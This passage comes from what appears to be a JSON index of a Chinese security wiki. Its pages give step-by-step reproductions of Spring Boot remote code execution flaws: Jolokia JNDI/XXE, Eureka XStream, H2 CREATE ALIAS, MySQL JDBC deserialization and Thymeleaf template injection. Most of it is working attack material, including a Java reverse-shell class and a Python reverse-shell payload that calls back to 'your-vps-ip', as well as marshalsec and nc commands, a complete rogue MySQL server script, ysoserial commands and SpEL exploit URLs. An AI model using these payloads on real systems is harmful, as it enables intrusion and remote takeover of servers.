配置不当导致的rce漏洞.html":{"url":"Web安全/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的rce漏洞/Spring Boot Actuator jolokia 配置不当导致的rce漏洞.html","title":"Spring Boot Actuator jolokia 配置不当导致的rce漏洞","keywords":"","body":"Spring Boot Actuator jolokia 配置不当导致的rce漏洞 一、漏洞简介 利用条件： 目标网站存在 /jolokia 或 /actuator/jolokia 接口 目标使用了 jolokia-core 依赖（版本要求暂未知）并且环境中存在相关 MBean 目标可以请求攻击者的 HTTP 服务器（请求可出外网） ldap 注入可能会受目标 JDK 版本影响，jdk \\ 二、漏洞影响 三、复现过程 漏洞原理 直接访问可触发漏洞的 URL，相当于通过 jolokia 调用 ch.qos.logback.classic.jmx.JMXConfigurator 类的 reloadByURL 方法 目标机器请求外部日志配置文件 URL 地址，获得恶意 xml 文件内容 目标机器使用 saxParser.parse 解析 xml 文件 (这里导致了 xxe 漏洞) xml 文件中利用 logback 依赖的 insertFormJNDI 标签，设置了外部 JNDI 服务器地址 目标机器请求恶意 JNDI 服务器，导致 JNDI 注入，造成 RCE 漏洞 漏洞复现 步骤一：查看已存在的 MBeans 访问 /jolokia/list 接口，查看是否存在 ch.qos.logback.classic.jmx.JMXConfigurator 和 reloadByURL 关键词。 步骤二：托管 xml 文件 在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443） 使用 python 快速开启 http server python2 -m SimpleHTTPServer 80 python3 -m http.server 80 在根目录放置以 xml 结尾的 ian.xml 文件，内容如下： 步骤三：准备要执行的 Java 代码 使用兼容低版本 jdk 的方式编译： javac -source 1.5 -target 1.5 JNDIObject.java 然后将生成的 JNDIObject.class 文件拷贝到刚刚用py开启的网站根目录。 JNDIObject.java //请自行修改代码中反弹shell的ip和端口 /** * javac -source 1.5 -target 1.5 JNDIObject.java * * Build By LandGrey * */ import java.io.File; import java.io.InputStream; import java.io.OutputStream; import java.net.Socket; public class JNDIObject { static { try{ String ip = \"your-vps-ip\"; String port = \"443\"; String py_path = null; String[] cmd; if (!System.getProperty(\"os.name\").toLowerCase().contains(\"windows\")) { String[] py_envs = new String[]{\"/bin/python\", \"/bin/python3\", \"/usr/bin/python\", \"/usr/bin/python3\", \"/usr/local/bin/python\", \"/usr/local/bin/python3\"}; for(int i = 0; i 0) { so.write(pi.read()); } while(pe.available() > 0) { so.write(pe.read()); } while(si.available() > 0) { po.write(si.read()); } so.flush(); po.flush(); Thread.sleep(50L); try { p.exitValue(); break; } catch (Exception e) { } } p.destroy(); s.close(); }catch (Throwable e){ e.printStackTrace(); } } } 步骤四：架设恶意 ldap 服务 下载 marshalsec ，使用下面命令架设对应的 ldap 服务： https://github.com/ianxtianxt/marshalsec ps:我这里发的是源码，需要用mvn编译marshalsec java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389 步骤五：监听反弹 shell 的端口 nc -lvvp 你上一步代码里设置的端口 步骤六：从外部 URL 地址加载日志配置文件 如果目标成功请求了ian.xml 并且 marshalsec 也接收到了目标请求，但是目标没有请求 JNDIObject.class，大概率是因为目标环境的 jdk 版本太高，导致 JNDI 利用失败。 替换实际的 your-vps-ip 地址访问 URL 触发漏洞： https://www.0-sec.org/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/your-vps-ip!/ian.xml 服务器请求日志 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:47 "},"Web安全/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.html":{"url":"Web安全/Spring Boot/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞/Spring Boot Actuator jolokia 配置不当导致的XXE漏洞.html","title":"Spring Boot Actuator jolokia 配置不当导致的XXE漏洞","keywords":"","body":"Spring Boot Actuator jolokia 配置不当导致的XXE漏洞 一、漏洞简介 Spring boot 会把 /! 解析成 /，所以我们只要署恶意脚本，让被攻击服务器访问就会触发漏洞。前提条件**查看jolokia/list中存在的 Mbeans，是否存在logback 库提供的reloadByURL方法** https://www.0-sec.org:9090/jolokia/list 二、漏洞影响 Spring Boot 2.x 三、复现过程 漏洞分析 触发流程 Spring-boot-actuator->Jolokia->Logback->JNDI->Rce 可以在 JolokiaMvcEndpoint 类中先看看 jolokia 是如何注册的，如下 只要是 /jolokia 为第一个 path 节点的，都会进入它的执行逻辑中，可以一直跟进到org.jolokia.http.HttpRequestHandler#handleGetRequest 里 在上图红框流程中，先对 path 做 / 切割分组，不过可以 1!/2 这样能够保留 / 符号，后边用得到可以根据 path 节点新建 JmxRequest 对象大致如下图所示，有这么些类别可以指定 我们主要观察 exec 类型的，它对应 org.jolokia.request.JmxExecRequest 类型，在它被创建时，会调用父类 org.jolokia.request.JmxObjectNameRequest 的构造函数，如下所示 跟进 initObjectName 函数，如下 如上图，这里将 exec 后面的第一个 path 节点带进了 javax.management.ObjectName 构造函数中 根据上图中的注释描述，可以根据一个字符串（对象名称的字符串表示形式）创建一个 ObjectName 对象，这个对象和后面的反射执行指定函数大有关系 然后将 path 的下一个节点赋值到 JmxExecRequst 的 operation 属性上，将剩余的 path 节点作为 List 赋值给 arguments 属性 至此 JmxRequest 创建完毕，进入 org.jolokia.http.HttpRequestHandler#executeRequest 执行流程当中，其中很多部分就不详细跟踪，大致是又根据 exec 类型创建了一个 org.jolokia.handler.ExecHandler 对象 看见poc很好奇参数转换过程是怎么样的 直接进入到 ExecHandler 的 doHandRequest 当中 如上图，就是将 JmxExecRequst 中的 operation 做参数类型鉴定，然后根据目标函数需要的参数类型，将 arguments 转换成对应类型，最后执行 server.invoke 的调用，这个调用就是执行我们指定的类中的指定的函数，那这里是不是能够任意类和任意函数都能执行呢，不是的，需要提前注册，注册的内容可以通过 /jolokia/list 查看 ch.qos.logback.classic.jmx.JMXConfigurator 就是能够调用的类之一，到了这里就进入到了 logback 的依赖包中 简单查看一下它的函数： 首先这个类名就很有意思 JMXConfigerator ，和 JMX 的配置有关，函数中也有个 reloadByURL ，从名字就能会意出通过远程加载配置文件并且重启配置23333 先查看 reloadByURL 函数 如上图，它的参数是一个 URL 类型的，我们传入进去只能是 String，但是不用方，ExecHandler 的 doHandRequest 当中会对目标函数的参数类型做适配，将 String 转换成 URL 。但是这里有个问题，因为需要指定 schema ，所以必须有类似 http:// 这样的开头，而我们的 path 进去以后，会用 / 切割分组的，所以就需要用到前面的流程中对 uri 的处理过程，只需要这样请求就好： http:!/!/ 跟入 doConfigure 函数 从 url 获取返回流传入下一个 doConfigure 函数，这里也能 ssrf 的跟进函数如下： 继续跟进上图中的红色方框如下 如上图所示，在调用 recordEvents 的时候带入了输入流，这个输入流是我们可控的，即在自己服务器上放置的 xml 文件， xml 解析的过程就是发生在 recordEvents 的执行过程中，而后红框的调用，是对已经解析完成的内容进行一定的逻辑操作，然后重载配置，后面的过程就不分析了，简单的去看一下 recordEvents 执行过程，如下 很简单，build 完成后直接 parse，那我们查看一下 build 的时候是否有做防护，如下 什么防护和限制都莫得，所以这里也可以造成 xxe 那么到现在为止，只是梳理出来了 xxe 的触发，rce 呢不方，我们查一查 logback insertFormJNDI 标签啥 其中的 env-entry-name 就是指向 jndi 的服务器地址，那么这里我们可以换成自己的恶意 jndi 服务器地址，通过 jndi 触发 java 反序列化，最终导致 RCE 漏洞复现 在VPS上创建logback.xml，logback中填写jndi服务，当调用时直接触发恶意class。 %remote;%int;]> &trick; 在VPS上创建ian.dtd \"> 开启http服务 python -m SimpleHTTPServer 80 远程访问logback.xml文件 https://www.0-sec.org:8090/jolokia/exec/ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator/reloadByURL/http:!/!/VPS地址!/logback.xml 可以看到服务器上也返回了响应日志 {width=\"5.833333333333333in\" height=\"0.3951881014873141in\"} 参考链接 https://xz.aliyun.com/t/4258 https://jianfensec.com/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Spring%20Boot%20Actuators%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93%E5%AF%BC%E8%87%B4RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/ Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:49 "},"Web安全/Spring Boot/Spring Boot eureka xstream deserialization rce/Spring Boot eureka xstream deserialization rce.html":{"url":"Web安全/Spring Boot/Spring Boot eureka xstream deserialization rce/Spring Boot eureka xstream deserialization rce.html","title":"Spring Boot Eureka Xstream Deserialization Rce","keywords":"","body":"Spring Boot eureka xstream deserialization rce 一、漏洞简介 利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标使用的 eureka-client \\spring-cloud-starter-netflix-eureka-client 依赖中） 目标可以请求攻击者的 HTTP 服务器（请求可出外网） 二、漏洞影响 三、复现过程 漏洞分析 eureka.client.serviceUrl.defaultZone 属性被设置为恶意的外部 eureka server URL 地址 refresh 触发目标机器请求远程 URL，提前架设的 fake eureka server 就会返回恶意的 payload 目标机器相关依赖解析 payload，触发 XStream 反序列化，造成 RCE 漏洞 漏洞复现 步骤一：架设响应恶意 XStream payload 的网站 提供一个依赖 Flask 并符合要求的python，作用是利用目标 Linux 机器上自带的 python 来反弹shell。 使用 python 在自己控制的服务器上运行以上的脚本，并根据实际情况修改脚本中反弹 shell 的 ip 地址和 端口号。 springboot-xstream-rce.py #!/usr/bin/env python # coding: utf-8 # -**- Author: LandGrey -**- from flask import Flask, Response app = Flask(__name__) @app.route('/', defaults={'path': ''}) @app.route('/', methods=['GET', 'POST']) def catch_all(path): xml = \"\"\" /bin/bash -c python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"your-vps-ip\",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/bash\",\"-i\"]);' false java.lang.ProcessBuilder start foo foo \"\"\" return Response(xml, mimetype='application/xml') if __name__ == \"__main__\": app.run(host='0.0.0.0', port=80) 步骤二：监听反弹 shell 的端口 一般使用 nc 监听端口，等待反弹 shell nc -lvp 443 步骤三：设置 eureka.client.serviceUrl.defaultZone 属性 spring 1.x POST /env Content-Type: application/x-www-form-urlencoded eureka.client.serviceUrl.defaultZone=http://your-vps-ip/example spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"eureka.client.serviceUrl.defaultZone\",\"value\":\"http://your-vps-ip/example\"} 步骤四：刷新配置 spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:53 "},"Web安全/Spring Boot/Spring Boot h2 database query rce/Spring Boot h2 database query rce.html":{"url":"Web安全/Spring Boot/Spring Boot h2 database query rce/Spring Boot h2 database query rce.html","title":"Spring Boot H 2 Database Query Rce","keywords":"","body":"Spring Boot h2 database query rce 一、漏洞简介 H2 database是一款Java内存数据库，多用于单元测试。H2 database自带一个Web管理页面，在Spirng开发中，如果我们设置如下选项，即可允许外部用户访问Web管理页面，且没有鉴权： spring.h2.console.enabled=true spring.h2.console.settings.web-allow-others=true 利用这个管理页面，我们可以进行JNDI注入攻击，进而在目标环境下执行任意命令。 利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /restart 接口重启应用（存在 spring-boot-starter-actuator 依赖） 存在 com.h2database.h2 依赖（版本要求暂未知） 二、漏洞影响 三、复现过程 漏洞原理 spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 CREATE ALIAS 创建自定义函数的 SQL 语句 其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句 restart 重启应用，会建立新的数据库连接 如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞 漏洞复现 步骤一：设置 spring.datasource.hikari.connection-test-query 属性 ⚠️ 下面payload 中的 \\'T5\\' 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发 spring 1.x（无回显执行命令） POST /env Content-Type: application/x-www-form-urlencoded spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc'); spring 2.x（无回显执行命令） POST /actuator/env Content-Type: application/json {\"name\":\"spring.datasource.hikari.connection-test-query\",\"value\":\"CREATE ALIAS T5 AS CONCAT('void ex(String m1,String m2,String m3)throws Exception{Runti','me.getRun','time().exe','c(new String[]{m1,m2,m3});}');CALL T5('cmd','/c','calc');\"} 步骤二：重启应用 spring 1.x POST /restart Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/restart Content-Type: application/json Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:53 "},"Web安全/Spring Boot/Spring Boot mysql jdbc deserialization rce/Spring Boot mysql jdbc deserialization rce.html":{"url":"Web安全/Spring Boot/Spring Boot mysql jdbc deserialization rce/Spring Boot mysql jdbc deserialization rce.html","title":"Spring Boot Mysql Jdbc Deserialization Rce","keywords":"","body":"Spring Boot mysql jdbc deserialization rce 一、漏洞简介 利用条件： 可以 POST 请求目标网站的 /env 接口设置属性 可以 POST 请求目标网站的 /refresh 接口刷新配置（存在 spring-boot-starter-actuator 依赖） 目标环境中存在 mysql-connector-java 依赖 目标可以请求攻击者的服务器（请求可出外网） 二、漏洞影响 三、复现过程 漏洞分析 spring.datasource.url 属性被设置为外部恶意 mysql jdbc url 地址 refresh 刷新后设置了一个新的 spring.datasource.url 属性值 当网站进行数据库查询等操作时，会尝试使用恶意 mysql jdbc url 建立新的数据库连接 然后恶意 mysql server 就会在建立连接的合适阶段返回反序列化 payload 数据 目标依赖的 mysql-connector-java 就会反序列化设置好的 gadget，造成 RCE 漏洞 漏洞复现 步骤一：查看环境依赖 GET 请求 /env 或 /actuator/env，搜索环境变量（classpath）中是否有 mysql-connector-java 关键词，并记录下其版本号（5.x 或 8.x）； 搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 commons-collections、Jdk7u21、Jdk8u20 等； 搜索 spring.datasource.url 关键词，记录下其 value 值，方便后续恢复其正常 jdbc url 值。 步骤二：架设恶意 rogue mysql server 在自己控制的服务器上运行springboot-jdbc-deserialization-rce.py脚本，并使用ysoserial自定义要执行的命令： springboot-jdbc-deserialization-rce.py #!/usr/bin/env python # coding: utf-8 # -**- Author: LandGrey -**- import os import socket import binascii def server_send(conn, payload): global count count += 1 print(\"[*] Package order: {}, Send: {}\".format(count, payload)) conn.send(binascii.a2b_hex(payload)) def server_receive(conn): global count, BUFFER_SIZE count += 1 data = conn.recv(BUFFER_SIZE) print(\"[*] Package order: {}, Receive: {}\".format(count, data)) return str(data).lower() def run_mysql_server(): global count, deserialization_payload while True: count = 0 conn, addr = server_socks.accept() print(\"[+] Connection from client -> {}:{}\".format(addr[0], addr[1])) greeting = '4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400' server_send(conn, greeting) if os.path.isfile(deserialization_file): with open(deserialization_file, 'rb') as _f: deserialization_payload = binascii.b2a_hex(_f.read()) while True: # client auth server_receive(conn) server_send(conn, response_ok) # client query data = server_receive(conn) if \"session.auto_increment_increment\" in data: _payload = '01000001132e00000203646566000000186175746f5f696e6372656d656e745f696e6372656d656e74000c3f001500000008a0000000002a00000303646566000000146368617261637465725f7365745f636c69656e74000c21000c000000fd00001f00002e00000403646566000000186368617261637465725f7365745f636f6e6e656374696f6e000c21000c000000fd00001f00002b00000503646566000000156368617261637465725f7365745f726573756c7473000c21000c000000fd00001f00002a00000603646566000000146368617261637465725f7365745f736572766572000c210012000000fd00001f0000260000070364656600000010636f6c6c6174696f6e5f736572766572000c210033000000fd00001f000022000008036465660000000c696e69745f636f6e6e656374000c210000000000fd00001f0000290000090364656600000013696e7465726163746976655f74696d656f7574000c3f001500000008a0000000001d00000a03646566000000076c6963656e7365000c210009000000fd00001f00002c00000b03646566000000166c6f7765725f636173655f7461626c655f6e616d6573000c3f001500000008a0000000002800000c03646566000000126d61785f616c6c6f7765645f7061636b6574000c3f001500000008a0000000002700000d03646566000000116e65745f77726974655f74696d656f7574000c3f001500000008a0000000002600000e036465660000001071756572795f63616368655f73697a65000c3f001500000008a0000000002600000f036465660000001071756572795f63616368655f74797065000c210009000000fd00001f00001e000010036465660000000873716c5f6d6f6465000c21009b010000fd00001f000026000011036465660000001073797374656d5f74696d655f7a6f6e65000c210009000000fd00001f00001f000012036465660000000974696d655f7a6f6e65000c210012000000fd00001f00002b00001303646566000000157472616e73616374696f6e5f69736f6c6174696f6e000c21002d000000fd00001f000022000014036465660000000c776169745f74696d656f7574000c3f001500000008a000000000f90000150131047574663804757466380475746638066c6174696e31116c6174696e315f737765646973685f6369000532383830300347504c013007343139343330340236300731303438353736034f4646894f4e4c595f46554c4c5f47524f55505f42592c5354524943545f5452414e535f5441424c45532c4e4f5f5a45524f5f494e5f444154452c4e4f5f5a45524f5f444154452c4552524f525f464f525f4449564953494f4e5f42595f5a45524f2c4e4f5f4155544f5f4352454154455f555345522c4e4f5f454e47494e455f535542535449545554494f4e035554430653595354454d0f52455045415441424c452d5245414405323838303007000016fe000002000200' server_send(conn, _payload) data = server_receive(conn) if \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f000059000005075761726e696e6704313238374b27404071756572795f63616368655f73697a6527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e59000006075761726e696e6704313238374b27404071756572795f63616368655f7479706527206973206465707265636174656420616e642077696c6c2062652072656d6f76656420696e2061206675747572652072656c656173652e07000007fe000002000000' server_send(conn, _payload) data = server_receive(conn) if \"set names\" in data: server_send(conn, response_ok) data = server_receive(conn) if \"set character_set_results\" in data: server_send(conn, response_ok) data = server_receive(conn) if \"show session status\" in data: _data = '0100000102' _data += '2700000203646566056365736869046f626a73046f626a730269640269640c3f000b000000030000000000' _data += '2900000303646566056365736869046f626a73046f626a73036f626a036f626a0c3f00ffff0000fc9000000000' _payload_hex = str(hex(len(deserialization_payload)/2)).replace('0x', '').zfill(4) _payload_length = _payload_hex[2:4] + _payload_hex[0:2] _data_hex = str(hex(len(deserialization_payload)/2 + 5)).replace('0x', '').zfill(6) _data_lenght = _data_hex[4:6] + _data_hex[2:4] + _data_hex[0:2] _data += _data_lenght + '04' + '0131fc' + _payload_length + deserialization_payload _data += '07000005fe000022000100' server_send(conn, _data) data = server_receive(conn) if \"show warnings\" in data: _payload = '01000001031b00000203646566000000054c6576656c000c210015000000fd01001f00001a0000030364656600000004436f6465000c3f000400000003a1000000001d00000403646566000000074d657373616765000c210000060000fd01001f00006d000005044e6f74650431313035625175657279202753484f572053455353494f4e20535441545553272072657772697474656e20746f202773656c6563742069642c6f626a2066726f6d2063657368692e6f626a73272062792061207175657279207265777269746520706c7567696e07000006fe000002000000' server_send(conn, _payload) break try: conn.close() except Exception as e: pass if __name__ == \"__main__\": HOST = \"0.0.0.0\" PORT = 3306 deserialization_file = r'payload.ser' if os.path.isfile(deserialization_file): with open(deserialization_file, 'rb') as f: deserialization_payload = binascii.b2a_hex(f.read()) else: deserialization_payload = 'aced****(your deserialized hex data)' count = 0 BUFFER_SIZE = 1024 response_ok = '0700000200000002000000' print(\"[+] rogue mysql server Listening on {}:{}\".format(HOST, PORT)) server_socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM) server_socks.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) server_socks.bind((HOST, PORT)) server_socks.listen(1) run_mysql_server() https://download.0-sec.org/download/ysoserial.zip java -jar ysoserial.jar CommonsCollections3 calc > payload.ser 在脚本同目录下生成 payload.ser 反序列化 payload 文件，供脚本使用。 步骤三：设置 spring.datasource.url 属性 ⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！ mysql-connector-java 5.x 版本设置属性值为： jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true mysql-connector-java 8.x 版本设置属性值为： jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&useSSL=false&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&autoDeserialize=true spring 1.x POST /env Content-Type: application/x-www-form-urlencoded spring.datasource.url=对应属性值 spring 2.x POST /actuator/env Content-Type: application/json {\"name\":\"spring.datasource.url\",\"value\":\"对应属性值\"} 步骤四：刷新配置 spring 1.x POST /refresh Content-Type: application/x-www-form-urlencoded spring 2.x POST /actuator/refresh Content-Type: application/json 步骤五：触发数据库查询 尝试访问网站已知的数据库查询的接口，例如： /product/list ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发 步骤六：恢复正常 jdbc url 反序列化漏洞利用完成后，使用 步骤三 的方法恢复 步骤一 中记录的 spring.datasource.url 的原始 value 值 Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:54 "},"Web安全/Spring Boot/Spring Boot sql/Spring Boot sql.html":{"url":"Web安全/Spring Boot/Spring Boot sql/Spring Boot sql.html","title":"Spring Boot Sql","keywords":"","body":"Spring Boot sql 一、漏洞简介 二、漏洞影响 三、复现过程 spring.datasource.tomcat.validationQuery=drop+table+users 许您指定任何SQL查询，它将针对当前数据库自动执行。它可以是任何语句，包括插入，更新或删除。 spring.datasource.tomcat.url=jdbc:hsqldb:https://localhost:3002/xdb 允许您修改当前的JDBC连接字符串。 最后一个看起来不错，但是问题是当运行数据库连接的应用程序已经建立时，仅更新JDBC字符串没有任何效果。希望在这种情况下，还有另一个属性可以对我们有所帮助： spring.datasource.tomcat.max-active=777 我们可以在此处使用的技巧是增加到数据库的同时连接数。因此，我们可以更改JDBC连接字符串，增加连接数，然后将许多请求发送到应用程序以模拟繁重的负载。在负载下，应用程序将使用更新的恶意JDBC字符串创建新的数据库连接。我在Mysql本地对这项技术进行了测试，它的工作原理就像一个魅力。 除此之外，还有其他一些看起来有趣的属性，但实际上并没有真正的用处： spring.datasource.url 数据库连接字符串（仅用于第一个连接） spring.datasource.jndiName 数据库JNDI字符串（仅用于第一个连接） spring.datasource.tomcat.dataSourceJNDI 数据库JNDI字符串（根本不使用） spring.cloud.config.uri=http://artsploit.com/ spring cloud配置url（在应用程序启动后不起任何作用，只使用初始值。） Qingy文库 all right reserved，powered by GitbookFile Modify: 2021-07-15 20:03:55 "},"Web安全/Spring Boot/Spring Boot Thymeleaf 模板注入/Spring Boot Thymeleaf 模板注入.html":{"url":"Web安全/Spring Boot/Spring Boot Thymeleaf 模板注入/Spring Boot Thymeleaf 模板注入.html","title":"Spring Boot Thymeleaf 模板注入","keywords":"","body":"Spring Boot Thymeleaf 模板注入 一、漏洞简介 Thymeleaf是用于Web和独立环境的现代服务器端Java模板引擎。类似与python web开发中的jinja模板引擎。顺便说一句，Thymeleaf是spring boot的推荐引擎 二、漏洞影响 三、复现过程 0x01 基础知识 Spring Boot 本身就 Spring MVC 的简化版本。是在 Spring MVC 的基础上实现了自动配置，简化了开发人员开发过程。Spring MVC 是通过一个叫 DispatcherServlet 前端控制器的来拦截请求的。而在 Spring Boot 中 使用自动配置把 DispatcherServlet 前端控制器自动配置到框架中。 例如，我们来解析 /users 这个请求 DispatcherServlet 前端控制器拦截请求 /users servlet 决定使用哪个 handler 处理 Spring 检测哪个控制器匹配 /users，Spring 从 \\@RquestMapping 中查找出需要的信息 Spring 找到正确的 Controller 方法后，开始执行 Controller 方法 返回 users 对象列表 根据与客户端交互需要返回 Json 或者 Xml 格式 spring boot 相关注解 \\@Controller 处理 Http 请求 \\@RestController \\@Controller 的衍生注解 \\@RequestMapping 路由请求 可以设置各种操作方法 \\@GetMapping GET 方法的路由 \\@PostMapping POST 方法的路由 \\@PutMapping PUT 方法的路由 \\@DeleteMapping DELETE 方法的路由 \\@PathVariable 处理请求 url 路径中的参数 /user/{id} \\@RequestParam 处理问号后面的参数 \\@RequestBody 请求参数以json格式提交 \\@ResponseBody 返回 json 格式 Controller注解 \\@Controller 一般应用在有返回界面的应用场景下.例如，管理后台使用了 thymeleaf 作为模板开发，需要从后台直接返回 Model 对象到前台，那么这时候就需要使用 \\@Controller 来注解。 RequestMapping注解 用来将一个controller添加至路由中 0x02 环境配置 https://github.com/veracode-research/spring-view-manipulation/ 我们以spring boot + Thymeleaf模板创建一个带有漏洞的项目。核心代码如下 @GetMapping(\"/path\") public String path(@RequestParam String lang) { return lang ; //template path is tainted } 代码含义如下：用户请求的url为path，参数名称为lang，则服务器通过Thymeleaf模板，去查找相关的模板文件。 例如，用户通过get请求/path?lang=en，则服务器去自动拼接待查找的模板文件名，为resources/templates/en.html，并返回给用户的浏览器。 上面的代码存在两个问题： 是不是存在任意文件读取？ 是不是存在诸如模板注入的漏洞？？？ 0x03 模板注入分析 spring boot如何查找controller这块我们不分析，因为对于我们不重要。 spring boot在org.springframework.web.servlet.ModelAndView方法中，开始处理用户的请求 /** * This implementation expects the handler to be an {@link HandlerMethod}. */ @Override @Nullable public final ModelAndView handle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception { return handleInternal(request, response, (HandlerMethod) handler); } 随后在org.springframework.web.servlet.mvc.method.annotation.ServletInvocableHandlerMethod#invokeAndHandle方法中，通过invokeForRequest函数，根据用户提供的url，调用相关的controller，并将其返回值，作为待查找的模板文件名，通过Thymeleaf模板引擎去查找，并返回给用户 /** * Invoke the method and handle the return value through one of the * configured {@link HandlerMethodReturnValueHandler HandlerMethodReturnValueHandlers}. * @param webRequest the current request * @param mavContainer the ModelAndViewContainer for this request * @param providedArgs \"given\" arguments matched by type (not resolved) */ public void invokeAndHandle(ServletWebRequest webRequest, ModelAndViewContainer mavContainer, Object... providedArgs) throws Exception { Object returnValue = invokeForRequest(webRequest, mavContainer, providedArgs); setResponseStatus(webRequest); if (returnValue == null) { if (isRequestNotModified(webRequest) || getResponseStatus() != null || mavContainer.isRequestHandled()) { disableContentCachingIfNecessary(webRequest); mavContainer.setRequestHandled(true); return; } } else if (StringUtils.hasText(getResponseStatusReason())) { mavContainer.setRequestHandled(true); return; } mavContainer.setRequestHandled(false); try { this.returnValueHandlers.handleReturnValue( returnValue, getReturnValueType(returnValue), mavContainer, webRequest); } } 在函数中，调用this.returnValueHandlers.handleReturnValue去处理返回结果。最终在org.springframework.web.servlet.mvc.method.annotation.ViewNameMethodReturnValueHandler#handleReturnValue方法中，将controller返回值作为视图名称。代码如下 @Override public void handleReturnValue(@Nullable Object returnValue, MethodParameter returnType, ModelAndViewContainer mavContainer, NativeWebRequest webRequest) throws Exception { if (returnValue instanceof CharSequence) { String viewName = returnValue.toString(); mavContainer.setViewName(viewName); if (isRedirectViewName(viewName)) { mavContainer.setRedirectModelScenario(true); } } spring boot最终在org.springframework.web.servlet.DispatcherServlet#processDispatchResult方法中，调用Thymeleaf模板引擎的表达式解析。将上一步设置的视图名称为解析为模板名称，并加载模板，返回给用户。核心代码如下org.thymeleaf.standard.expression.IStandardExpressionParser#parseExpression final String viewTemplateName = getTemplateName(); final ISpringTemplateEngine viewTemplateEngine = getTemplateEngine(); final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration); final FragmentExpression fragmentExpression; try { // By parsing it as a standard expression, we might profit from the expression cache fragmentExpression = (FragmentExpression) parser.parseExpression(context, \"~{\" + viewTemplateName + \"}\"); } catch (final TemplateProcessingException e) { throw new IllegalArgumentException(\"Invalid template name specification: '\" + viewTemplateName + \"'\"); } 0x04 不安全的java代码 第一种： @GetMapping(\"/path\") public String path(@RequestParam String lang) { return lang ; //template path is tainted } 在查找模板中，引用了用户输入的内容 payload GET /path?lang=__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x HTTP/1.1 Host: www.0-sec.org:8090 Connection: close 第二种 根据spring boot定义，如果controller无返回值，则以GetMapping的路由为视图名称。当然，对于每个http请求来讲，其实就是将请求的url作为视图名称，调用模板引擎去解析。 https://docs.spring.io/spring/docs/current/spring-framework-reference/web.html\\#mvc-ann-return-types 在这种情况下，我们只要可以控制请求的controller的参数，一样可以造成RCE漏洞。例如我们可以控制document参数 @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); } GET /doc/__${T(java.lang.Runtime).getRuntime().exec(\"touch executed\")}__::.x 0x05 修复方案 1. 设置ResponseBody注解 如果设置ResponseBody，则不再调用模板解析 2. 设置redirect重定向 @GetMapping(\"/safe/redirect\") public String redirect(@RequestParam String url) { return \"redirect:\" + url; //CWE-601, as we can control the hostname in redirect 根据spring boot定义，如果名称以redirect:开头，则不再调用ThymeleafView解析，调用RedirectView去解析controller的返回值 3. response @GetMapping(\"/safe/doc/{document}\") public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\"Retrieving \" + document); //FP } 由于controller的参数被设置为HttpServletResponse，Spring认为它已经处理了HTTP Response，因此不会发生视图名称解析 参考链接 https://www.cnblogs.com/potatsoSec/p/13620019.html Qingy文库 all right reserved，powered by GitbookFile Modify: 